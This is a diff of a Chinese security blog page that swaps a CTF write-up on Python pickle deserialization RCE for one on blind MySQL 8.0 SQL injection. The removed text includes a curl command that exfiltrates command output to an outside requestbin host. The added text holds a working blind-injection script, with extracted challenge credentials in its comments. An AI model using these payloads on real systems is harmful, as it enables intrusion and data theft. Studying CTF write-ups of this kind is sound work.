@@ -20,18 +20,18 @@
     var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="[watevrCTF-2019]Pickle Store之前做了他们的一个cookie store的题目，cookie伪造一下就能过，是个水题，就顺着做了他们的pickle store，做起来就不太对劲了，难度upup 同样在cookie处能取得一串base64，解码之后用pickle.loads加载，可以看到一个数组，记载了钱数和货物，但是这回多了一个hmac的签名，加密用的密钥是没办法搞出来了">
-<meta name="keywords" content="wp,反序列化,python">
+  <meta name="description" content="pwnhub7月公开赛由于长时间的逃避SQL注入导致我现在又是一个SQL注入废物，以前做过的东西也记不清了 newsql提示使用SQL8.0的新操作 简单测一下发现有报错，过滤的比较关键的东西有select，去掉这个战斗力减少100%，给了报错但是extractvalue之类的函数也没了，sleep也没了，不过很明显的登录成功时状态码200，失败时状态码500。出题人似乎还想用登录成功就直接重定向">
+<meta name="keywords" content="SQLI">
 <meta property="og:type" content="article">
-<meta property="og:title" content="[watevrCTF2019]Pickle_Store">
-<meta property="og:url" content="https:&#x2F;&#x2F;blog.z3ratu1.cn&#x2F;%5BwatevrCTF-2019%5DPickle%20Store.html">
+<meta property="og:title" content="pwnhub7月公开赛">
+<meta property="og:url" content="https:&#x2F;&#x2F;blog.z3ratu1.cn&#x2F;pwnhub7%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9B.html">
 <meta property="og:site_name" content="Z3ratu1&#39;s blog">
-<meta property="og:description" content="[watevrCTF-2019]Pickle Store之前做了他们的一个cookie store的题目，cookie伪造一下就能过，是个水题，就顺着做了他们的pickle store，做起来就不太对劲了，难度upup 同样在cookie处能取得一串base64，解码之后用pickle.loads加载，可以看到一个数组，记载了钱数和货物，但是这回多了一个hmac的签名，加密用的密钥是没办法搞出来了">
+<meta property="og:description" content="pwnhub7月公开赛由于长时间的逃避SQL注入导致我现在又是一个SQL注入废物，以前做过的东西也记不清了 newsql提示使用SQL8.0的新操作 简单测一下发现有报错，过滤的比较关键的东西有select，去掉这个战斗力减少100%，给了报错但是extractvalue之类的函数也没了，sleep也没了，不过很明显的登录成功时状态码200，失败时状态码500。出题人似乎还想用登录成功就直接重定向">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2020-07-12T08:33:48.508Z">
+<meta property="og:updated_time" content="2021-07-06T13:11:01.435Z">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="https://blog.z3ratu1.cn/%5BwatevrCTF-2019%5DPickle%20Store.html">
+<link rel="canonical" href="https://blog.z3ratu1.cn/pwnhub7%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9B.html">
 
 
 <script id="page-configurations">
@@ -44,7 +44,7 @@
   };
 </script>
 
-  <title>[watevrCTF2019]Pickle_Store | Z3ratu1's blog</title>
+  <title>pwnhub7月公开赛 | Z3ratu1's blog</title>
   
 
 
@@ -198,7 +198,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/%5BwatevrCTF-2019%5DPickle%20Store.html">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/pwnhub7%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9B.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
@@ -211,7 +211,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          [watevrCTF2019]Pickle_Store
+          pwnhub7月公开赛
         </h1>
 
         <div class="post-meta">
@@ -220,16 +220,10 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2020-02-28 19:40:00" itemprop="dateCreated datePublished" datetime="2020-02-28T19:40:00+08:00">2020-02-28</time>
+              <time title="创建时间：2021-07-06 20:32:47 / 修改时间：21:11:01" itemprop="dateCreated datePublished" datetime="2021-07-06T20:32:47+08:00">2021-07-06</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-07-12 16:33:48" itemprop="dateModified" datetime="2020-07-12T16:33:48+08:00">2020-07-12</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -241,7 +235,7 @@
             </span>
 
           
-            <span id="/%5BwatevrCTF-2019%5DPickle%20Store.html" class="post-meta-item leancloud_visitors" data-flag-title="[watevrCTF2019]Pickle_Store" title="阅读次数">
+            <span id="/pwnhub7%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9B.html" class="post-meta-item leancloud_visitors" data-flag-title="pwnhub7月公开赛" title="阅读次数">
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
@@ -256,8 +250,8 @@
       </span>
       <span class="post-meta-item-text">Valine：</span>
     
-    <a title="valine" href="/%5BwatevrCTF-2019%5DPickle%20Store.html#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/%5BwatevrCTF-2019%5DPickle%20Store.html" itemprop="commentCount"></span>
+    <a title="valine" href="/pwnhub7%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9B.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/pwnhub7%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9B.html" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -272,14 +266,45 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h1><p>之前做了他们的一个cookie store的题目，cookie伪造一下就能过，是个水题，就顺着做了他们的pickle store，做起来就不太对劲了，难度upup</p>
-<p>同样在cookie处能取得一串base64，解码之后用pickle.loads加载，可以看到一个数组，记载了钱数和货物，但是这回多了一个hmac的签名，加密用的密钥是没办法搞出来了，那就只能另寻他路</p>
-<h2 id="pickle反序列化漏洞"><a href="#pickle反序列化漏洞" class="headerlink" title="pickle反序列化漏洞"></a>pickle反序列化漏洞</h2><p>python的反序列化漏洞危害比PHP要大，因为能做到任意代码执行，直接写一个类，创建一个__reduce__方法，该方法在该类被序列化时使用，返回字符串或元组。<br>我们可以在返回值处调用我们想要使用的函数，不过这种方法只能调用一个函数，例如<code>return (os.system,(&#39;ls&#39;,))</code>，并且这里是一定要加逗号的，圆括号中添加逗号会将其声明为元组，而规定__reduce__方法的返回值必须是<strong>字符串或元组</strong>，使用不这么用就会报错</p>
-<p>不过不必担心没有导入os模块，我们可以在__reduce__方法中使用import进行导入，__reduce__方法作为序列化的魔法方法，返回值可以被我们控制为函数，其被反序列化时可被执行，但这样子可以执行的函数只有返回值的那一个，想要执行多个代码，我们需要手搓pickle(但是没懂为什么可以在__reduce__中import模块来导入本来没有的模块)</p>
-<h3 id="坑点1"><a href="#坑点1" class="headerlink" title="坑点1"></a>坑点1</h3><p>不同平台下的反序列化结果是不一样的，甚至python的版本也会影响pickle的结果，使用这个题在Windows下生成的payload就不奏效，最后又回到Linux上做payload</p>
-<h3 id="坑点2"><a href="#坑点2" class="headerlink" title="坑点2"></a>坑点2</h3><p>这里无论执行什么都不会有回显，但是通过执行time.sleep发现有明显的延迟，证实可以命令执行，使用url进行外带或者反弹shell，反弹shell弹了几下没成功，curl外带可以去buu的这个平台<a href="http://http.requestbin.buuoj.cn/" target="_blank" rel="external nofollow noopener noreferrer">http://http.requestbin.buuoj.cn/</a><br>执行的命令是 <code>curl http://http.requestbin.buuoj.cn/17ozn5q1/\?a=\</code>ls / | base64 | sed -n “1p”``<br>一开始还没看懂，其实就是像这个平台发一个请求，用GET提交一个a，内容为反引号命令执行的内容</p>
-<h3 id="手搓pickle的任意命令执行"><a href="#手搓pickle的任意命令执行" class="headerlink" title="手搓pickle的任意命令执行"></a>手搓pickle的任意命令执行</h3><p>使用一个名为marshal的库可以实现(不过如果这个库被ban了也就没戏了)<br>参考链接 <a href="https://www.freebuf.com/articles/system/89165.html" target="_blank" rel="external nofollow noopener noreferrer">https://www.freebuf.com/articles/system/89165.html</a></p>
-<p>比如p神说的这种情况，这时需要真正的手搓pickle，理解其基本意义，实现命令执行<br><a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html" target="_blank" rel="external nofollow noopener noreferrer">p神的题和解法</a></p>
+        <h1 id="pwnhub7月公开赛"><a href="#pwnhub7月公开赛" class="headerlink" title="pwnhub7月公开赛"></a>pwnhub7月公开赛</h1><p>由于长时间的逃避SQL注入导致我现在又是一个SQL注入废物，以前做过的东西也记不清了</p>
+<h2 id="newsql"><a href="#newsql" class="headerlink" title="newsql"></a>newsql</h2><p>提示使用SQL8.0的新操作</p>
+<p>简单测一下发现有报错，过滤的比较关键的东西有select，去掉这个战斗力减少100%，给了报错但是extractvalue之类的函数也没了，sleep也没了，不过很明显的登录成功时状态码200，失败时状态码500。<br>出题人似乎还想用登录成功就直接重定向到home的界面来迷惑我，但是好像有点太直接了，反手一个python发包搞定<br>以前应该是做过SQL8.0的题目的，一时间想不起来了，后来翻了半天发现是去年年底的嘶吼SQL大礼包里面有一个8.0的table语句加行比较操作进行注入，这么一来就简单了。既然是学过的东西复现一下就能搞定，把嘶吼的垃圾脚本翻出来改改，慢悠悠的注就行<br>嘶吼的wp<br><a href="/%5BRoarCTF2020%5Dwp.html">RoarCTF2020wp</a><br>再补一个mysql8.0的操作<br><a href="https://www.anquanke.com/post/id/231627" target="_blank" rel="external nofollow noopener noreferrer">MySQL8.0绕过手段</a></p>
+<p>注出来的flag不知道是不是真flag。。。长得有点诡异，然后反过来去注用户，确实有第二个用户，不过登录了一下发现好像也没什么变化，就拉倒了</p>
+<p>附上垃圾脚本</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+
+<span class="token comment" spellcheck="true"># 空格 # = > like union select database () sleep extractvalue</span>
+url <span class="token operator">=</span> <span class="token string">"http://47.99.38.177:10084/"</span>
+charset <span class="token operator">=</span> <span class="token string">"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz}`"</span>
+
+db_name <span class="token operator">=</span> <span class="token string">"ctf"</span>  <span class="token comment" spellcheck="true"># mysql information_schema performand sys ctf</span>
+table_name <span class="token operator">=</span> <span class="token string">"f1aggghere"</span>  <span class="token comment" spellcheck="true"># f1aggghere      users</span>
+column_name <span class="token operator">=</span> <span class="token string">""</span>    <span class="token comment" spellcheck="true"># ID FLAG 2列    id username password 三列</span>
+content <span class="token operator">=</span> <span class="token string">""</span>        <span class="token comment" spellcheck="true"># TH1S1STHEFL0GGGTH0TY0UA1WAYSW0NT         1 admin admin123    2 whoami whoami369</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment" spellcheck="true"># for c in charset:</span>
+    <span class="token keyword">for</span> c <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment" spellcheck="true"># 当前字符相等时比较下一位，故仍是小于，需大于时才能确定，故下面需要-1，表名ctf排第一，所以直接以表名排序</span>
+        <span class="token comment" spellcheck="true"># payload = "123' or ('def','{}','',4,5,6)&lt;(table information_schema.schemata limit 4,1)#".replace(' ', '/**/').format(db_name + c)</span>
+        <span class="token comment" spellcheck="true"># payload = "123' or ('def','{}','{}','',5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1)&lt;(table information_schema.tables order by table_schema limit 1,1)#".replace(' ', '/**/').format(db_name, table_name + c)</span>
+        <span class="token comment" spellcheck="true"># payload = "123' or ('def','{}','{}','{}','',6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2)&lt;(table information_schema.columns order by table_schema limit 2,1)#".replace(' ', '/**/').format(db_name, table_name, column_name + c)</span>
+        payload <span class="token operator">=</span> <span class="token string">"123' or (1, 0x{})&lt;(table {} limit 0,1)#"</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'/**/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>content <span class="token operator">+</span> <span class="token string">"{:02X}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span> table_name<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span>
+        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+        <span class="token comment" spellcheck="true"># print(res.text)</span>
+        <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
+            content <span class="token operator">+=</span> <span class="token string">"{:02X}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>c<span class="token number">-1</span><span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+</code></pre>
+<p>使用垃圾脚本的时候还是踩了一两个坑，table_schema是库名，就6列，table_name表名，21列，columns_name列名，22列。实际上列名没什么用，到时候猜一下有几列都行，反正给了报错<br>当注入对比的是行的最后一个字段时，最后一位跑出来的结果应当+1，因为之前的都给我减了个1，如果不是最后一个字段的话就简单的令下一个字段为空字符串，小于一切<br>第一列稳定是’def’，第二列就是库名，第三列表名，第四列列名，边注入记得边更新，然后还可以使用对库名排序的方式来快速定位到表的字段位置，列名没什么用。不如不注节约时间<br>注数据的时候如果第一列是ID，用字符也没什么问题，反正弱类型数字1和字符1也相等</p>
+<p>最后注flag时用的16进制能区分大小写，<code>&quot;{:02X}&quot;.format(c)</code>是我学的全新操作，快速做到十进制十六进制转换，强有力且方便<br>嘶吼的wp中我有提到用binary区分大小写，但是后来发现那是只有一列的时候才能用的操作，那次刚好flag就一列所以能用</p>
+<h3 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h3><p>以上是交给pwnhub的wp，现在我有一点简单的吐槽。<br>首先是这个必须交wp才能交flag这个操作，着实有点坑，搞得我一开始注出来这个奇怪的东西也不知道对不对，还去把users表也打了一遍<br>其次是flag我为了区分大小写还专门把payload换成了16进制，注出来的flag是全大写的，最后交了好几次发现flag其实是小写的，这个是真的坑嗷</p>
+<pre class=" language-mysql"><code class="language-mysql">mysql> select ('1', 0x60)<(1,'a'); 0 1 +---------------------+ | ('1', 0x60)<(1,'a') row in set (0.00 sec) mysql> select ('1', 0x60)<(1,'a'); 1 +---------------------+ | ('1', 0x60)<(1,'a') row in set (0.00 sec)< code></(1,'a');></(1,'a');></code></pre>
+<p>再次，flag还要套上flag，但是并没有什么说明文档说明这一点，交flag的时候感觉自己像个小丑在一点点猜</p>
+<h2 id="PyPrint"><a href="#PyPrint" class="headerlink" title="PyPrint"></a>PyPrint</h2><p>这个题能传一个python脚本上去然后给你运行一下输出结果，题目是这么写的，然后题目会告诉你他只认print和#，但事实上我的测试结果是他只认#，其他的咋输入都会报错只认得print和#。。。。<br>然后无论是报错还是只有#执行成功，输出都会把以#开头的一行去掉。但说实话，还有一个功能我都不知道该怎么用，已经给我看傻了。这个题目有点奇怪</p>
+<p>咕了，事情还没做完呢</p>
 
     </div>
 
@@ -289,9 +314,7 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/wp/" rel="tag"># wp</a>
-              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># 反序列化</a>
-              <a href="/tags/python/" rel="tag"># python</a>
+              <a href="/tags/SQLI/" rel="tag"># SQLI</a>
           </div>
 
         
@@ -300,13 +323,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/%5B%E5%98%B6%E5%90%BCCTF%5D%20Online%20Proxy.html" rel="prev" title="嘶吼CTF Online Proxy">
-      <i class="fa fa-chevron-left"></i> 嘶吼CTF Online Proxy
+    <a href="/%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C%E6%9D%82%E8%B0%88.html" rel="prev" title="虚拟网络杂谈">
+      <i class="fa fa-chevron-left"></i> 虚拟网络杂谈
     </a></div>
-      <div class="post-nav-item">
-    <a href="/PHP%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E.html" rel="next" title="PHP文件操作漏洞">
-      PHP文件操作漏洞 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -366,7 +386,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#watevrCTF-2019-Pickle-Store"><span class="nav-number">1.</span> <span class="nav-text">[watevrCTF-2019]Pickle Store</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pickle反序列化漏洞"><span class="nav-number">1.1.</span> <span class="nav-text">pickle反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#坑点1"><span class="nav-number">1.1.1.</span> <span class="nav-text">坑点1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#坑点2"><span class="nav-number">1.1.2.</span> <span class="nav-text">坑点2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#手搓pickle的任意命令执行"><span class="nav-number">1.1.3.</span> <span class="nav-text">手搓pickle的任意命令执行</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwnhub7月公开赛"><span class="nav-number">1.</span> <span class="nav-text">pwnhub7月公开赛</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#newsql"><span class="nav-number">1.1.</span> <span class="nav-text">newsql</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#后话"><span class="nav-number">1.1.1.</span> <span class="nav-text">后话</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PyPrint"><span class="nav-number">1.2.</span> <span class="nav-text">PyPrint</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
